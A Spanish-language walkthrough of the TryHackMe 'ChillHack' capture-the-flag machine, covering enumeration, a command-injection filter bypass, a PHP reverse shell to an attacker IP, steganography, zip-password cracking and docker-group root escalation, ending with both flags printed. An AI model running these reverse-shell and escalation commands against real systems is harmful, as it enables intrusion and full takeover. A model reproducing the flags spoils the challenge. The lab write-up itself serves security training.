# ChillHack
Máquina resuelta de *TryHackMe* en la que se trabaja la enumeración y *fingerprinting*, *reverse shell* y la escucha de puertos, esteganografía, el descubrimiento de contraseñas por fuerza bruta y la escalada de privilegios.
<div>
  <img src="https://img.shields.io/badge/-Kali-5e8ca8?style=for-the-badge&logo=kalilinux&logoColor=white" />
  <img src="https://img.shields.io/badge/-Nmap-6933FF?style=for-the-badge&logo=nmap&logoColor=white" />
  <img src="https://img.shields.io/badge/-Dirsearch-005571?style=for-the-badge&logo=dirsearch&logoColor=white" />
  <img src="https://img.shields.io/badge/-php-777BB4?style=for-the-badge&logo=php&logoColor=white" />
  <img src="https://img.shields.io/badge/-Bash-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white" />
  <img src="https://img.shields.io/badge/-python-3776AB?style=for-the-badge&logo=python&logoColor=white" />
  <img src="https://img.shields.io/badge/-Netcat-F5455C?style=for-the-badge&logo=netcat&logoColor=white" />
  <img src="https://img.shields.io/badge/-steghide-FF5200?style=for-the-badge&logo=steghide&logoColor=white" />
  <img src="https://img.shields.io/badge/-unzip-000000?style=for-the-badge&logo=unzip&logoColor=white" />
  <img src="https://img.shields.io/badge/-zip2john-EBAF00?style=for-the-badge&logo=zip2john&logoColor=white" />
  <img src="https://img.shields.io/badge/-john-F4B942?style=for-the-badge&logo=john&logoColor=white" />
</div>

## Objetivo

Explicar la realización del siguiente _Capture the flag_ perteneciente a la plataforma *TryHackMe*. Este desafío . Para ello, se deberá interactuar con un formulario, penetrar en la máquina y realizar una escalada de privilegios.

## Que hemos aprendido?

- Realizar *fingerprinting* y enumeración de puertos y enumeración web.
- Realizar una conxexión FTP.
- Realizar una *reverse shell*.
- Poner en escucha los puertos de la máquina.
- Obtener una *shell* a partir de un *script*.
- Crear un servidor con *python3*.
- Obtener información oculta en imágenes.
- Descomprimir archivos.
- Crackear contraseñas.
- Escalada de privilegios.

## Herramientas utilizadas

- *Kali Linux*.
- Enumeración: *Nmap*, *Dirsearch*.
- Penetración: *FTP*, *Bash*, *PHP*, *Netcat*, *Python3*, *Steghide*,  *Unzip*, *Zip2john*, *John*. 

## Steps

### Enumeración y fingerprinting

La máquina a vulnerar pertenece a la plataforma *TryHackMe*, la propia web te proporciona la IP de la máquina víctima. La conexión a esta se hace mediante una VPN que te proporciona THM y asigna una nueva IP para que tu máquina interactúe con la máquina vulnerable.

El primer paso es lanzar **Nmap** sin *ping* (-Pn) y con los *scripts* por *default* de la herramienta (-sC) para que encuentre vulnerabilidades. Además, se quieren conocer las versiones que corren en cada puerto (-sV) y el sistema operativo (-O). No se indica, específicamente, que compruebe todos los puertos pues en este tipo de máquina no será necesario.

<code>nmap -Pn -sV -O 10.10.198.179 -sC</code>

![Captura de pantalla 2025-04-12 174419](https://github.com/user-attachments/assets/b26cb007-7731-455d-a0bb-1105b85ab78b)

El comando devuelve 3 puertos TCPs abiertos:  
- En el puerto 21 corre la versión *vsftpd 3.0.3* del servicio *FTP*. Los *scripts* nos informan de que es posible acceder al servicio con el usuario 'Anonymous', el cual no necesita contraseña.
- En el puerto 22 corre la versión *Openssh 7.6p1*, en un sistema *Ubuntu*, servicio *SSH*.  
- En el puerto 80 corre el servidor *Apache 2.4.49*, en un sistema *Ubuntu*, servicio *HTTP*.

Primero nos dirigimos, desde el navegador, al puerto 80 de la IP dada, donde se puede ver una página web de deportes. Después de inspeccionarla y navegar por ella, no se encuentra ninguna pista para la explotación.

Seguidamente, con la ayuda de la herramienta **Dirsearch**, se hace una enumeración de posibles directorios y archivos que se encuentren en la web. Por la parte de directorios, aparecen varios pero llama la atención '/secret/', al cual nos dirigiremos primero. *Dirsearch* es lanzado con **Python3** indicando la IP a atacar (-u) y la lista a utilizar para la enumeración (-w); en este caso la 'directory-list-lowercase-2.3-small.txt'.

<code>sudo python3 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u 10.10.198.179 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt</code>

![Captura de pantalla 2025-04-12 183016](https://github.com/user-attachments/assets/5d917c94-9d13-4a58-8966-c37cae458572)

En el directorio '/secret' se encuentra un panel de comandos el cual tiene una *blacklist* por medio de la cual está filtrando e impidiendo utilizar una serie de palabras. Cada vez que salta este filtro, se muestra una imagen de alerta y un mensaje preguntando '¿eres un hacker?'. Después de realizar varias pruebas, se ha comprobado que hay maneras de saltarse el filtro como concatenando un comando válido con otro por medio de ';'. U ofuscando paalbras, cambiando caracteres por el signo de interrogació, por poner un ejemplo.

### Vulnerabilidades explotadas

Por una parte, se realiza la conexión *FTP* indicando la IP de la víctima, donde se encuentra un documento donde se mencionan 2 posibles usuarios del sistema 'Anurodh' y 'Apaar', e informa del filtrado que ya se ha comprobado en el formulario anterior: *Anurodh told me that there is some filtering on strings being put in the command -- Apaar*.

<code>ftp 10.10.198.179</code>

![Captura de pantalla 2025-04-12 175910](https://github.com/user-attachments/assets/5c4f80d6-b28d-424f-b830-a074bf2a182b)

Como se comentaba en el anterior apartado el panel de comandos no permite según que palabras, tales como  <code>cat</code> o <code>ls</code>. Por todo esto, lo más cómodo será realizar una **reverse shell**. Así que antes se pretende comprobar si dispone de la herramienta de **php** la máquina, para realizar el ataque con esta. Concatenando los siguiente comandos se consigue una respuesta positiva.

<code>pwd;php --version</code>

Con todo esto solo es necesario habilitar un puerto en escucha de la máquina atacante como se ha hecho en otras ocasiones. Y visistar la página de [*Pentestmonkey*](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) para obtener el código *php* para la *reverseshell* que se introducirá en el panel.

<code>nc -lvnp 1234</code>

<code>pwd;php -r '$sock=fsockopen("10.23.92.113",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</code>

![Captura de pantalla 2025-04-13 205517](https://github.com/user-attachments/assets/9e321c4d-87e2-4b48-9847-503742a49d91)

Hecho esto se consigue una *shell* y se comprueba que somos el usuario 'www-data'. En el directorio '/home' aparecen 3 usuarios, de los cuales se tiene acceso a la carpeta de 'apaar'. Dentro de esta, se encuentra el archivo oculto '.helpline.sh', el cual es un *script* que pide introducir el nombre de la persona con la que quieres hablar y el mensaje que le quieres dejar. Puesto que no se sanitizan las posibles entradas por teclado, esto se puede utilizar para hacer aparecer la *shell* de Apaar y de esta manera obtener acceso a su usuario.
Para ello se ejecuta el archivo con la ruta absoluta y con el usuario 'apaar'. Para que al provocar la *shell*, esta sea la de este usuario. Esto mismo se consigue introduciendo como respuesta a las preguntas del código <code>/bin/bash</code>.

<code>sudo -u apaar /home/apaar/.helpline.sh</code>

Una vez hecho esto se comprueb el usuario alcanzado y su id.

![image](https://github.com/user-attachments/assets/45d7d820-8d96-442d-9c63-f16b6a56bee9)

Ahora ya se tienen los suficientes permisos para leer el archivo 'local.txt' (/home/apaar) donde se encuentra la primera de las *flags*.

**Flag: {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}**

A continuación se inspecciona el contenido del directorio '/var/www/files' en el cual hay un archivo *php* llamado 'hacker.php' que se puede ejecutar con el usuario Apaar. En este se nombra la imagen 'hacker-with-laptop_23-2147985341.jpg' y nos induce a analizarla más allá de lo que pueda mostrar a simple vista. Una referencia clara a buscar información oculta en la imagen por medio de esteganografía.

![Captura de pantalla 2025-04-13 213653](https://github.com/user-attachments/assets/52295999-99d8-499c-8ef8-48722fa0706f)

Así pues, primero se debe descargar la imagen creando un servidor desde la carpeta contenedora de la imagen con el módulo *http.server*, de **Python3**. Se indica el puerto en el que se hospedará el servidor y desde el navegador se puede comprobar la creación del servidor y la existencia de la imagen y el resto de archivos del directorio en cuestión.

<code> python3 -m http.server 8000</code>

![Captura de pantalla 2025-04-13 214254](https://github.com/user-attachments/assets/a45013b7-436a-4c73-a04e-4758747414f1)

Desde la máquina atacante se procede a descargar el *jpg*, indicando la dirección del recurso. Seguidamente se extrae la información de la imagen con la herramienta **Steghide**, la cual vuelca los datos en el archivo 'backup.zip'. Este se puede descomprimir con la herramienta **unzip** pero está protegido con contraseña, por lo que será necesario encontrar esta primero. Inicialmente se saca el *hash* del archivo con el binario **zip2john** y después se trabajará con este.

<code>wget http://10.10.118.151:8000/hacker-with-laptop_23-2147985341.jpg</code>

<code>steghide extract -sf hacker-with-laptop_23-2147985341.jpg </code>

<code>unzip backup.zip</code>

<code>zip2john backup.zip > pwd</code>

![Captura de pantalla 2025-04-13 215809](https://github.com/user-attachments/assets/0a35f730-e470-4fd8-954f-b27e4078ad1d)

Con **John** se prueban las diferentes palabras de la lista 'rockyou.txt' con el archivo 'pwd' que contiene el *hash* antes obtenido. Finalmente, la herramiensta encuentra la contraseña siendo esta 'pass1word'. Ahora ya se puede descomprimir el *zip* indicándole la *password* encontrada con el cual conseguimos el archivo 'source_code.php'. 

<code>john --wordlist=/usr/share/wordlists/rockyou.txt pwd</code>

![Captura de pantalla 2025-04-13 220330](https://github.com/user-attachments/assets/3652c4fd-c63c-444b-9d21-7608617a8926)

En el código se puede ver como en una sentencia *if* iguala una contraseña con su forma en base64 para entrar dentro de la condición. Por lo que se intentará decodificar tal *password* con el siguiente comando.

<code>echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d</code>

![Captura de pantalla 2025-04-13 220539](https://github.com/user-attachments/assets/3a1d4338-44cc-40d6-909c-a95dc6a3773c)

Una vez obtenida la contraseña (*!d0ntKn0wmYp@ssw0rd*), se prueba con el usuario 'anurodh' y se pivota de nuevo de usuario. Además se comprueba que este pertenece al grupo *docker*, por lo que será útil para la escalada de privilegios. Esto es así porque este grupo otorga prácticamente permisos de administrador (*root*), puesto que el *daemon* de *Docker* tiene acceso completo al sistema. Así que cualquiera que esté en ese grupo podría, indirectamente, hacer cosas como *root*.

Por lo que se pretenden ver las imágenes del *Docker*, que son como plantillas para crear contenedores. De las dos existentes nos quedamos con la más reciente *Apline*. Con esto se puede ir a la página [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) para *bypasear* el binario *Docker* y realizar la escalada de privilegios.

<code>docker images</code>

<code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code>

Finalmente, se ha alcanzado el usuario *root* y solo queda dirigirse a su directorio y obtener la *flag* del archivo 'proof.txt'.

![Captura de pantalla 2025-04-13 221157](https://github.com/user-attachments/assets/3a5ccc6e-22a7-44e0-8cdd-bec5a8c2c76b)

**Flag:{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}**
